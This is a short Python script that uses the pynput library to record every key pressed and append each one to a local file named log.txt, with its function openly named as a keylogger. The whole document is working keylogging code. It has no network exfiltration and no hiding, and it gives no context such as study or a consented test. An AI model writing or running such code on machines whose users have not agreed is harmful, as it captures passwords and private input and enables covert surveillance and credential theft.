from pynput.keyboard import Listener    

def hamid_keylogger(key):
    with open("log.txt", "a") as f:
        f.write(str(key) + "\n")

with Listener(on_press=hamid_keylogger) as listener:
    listener.join()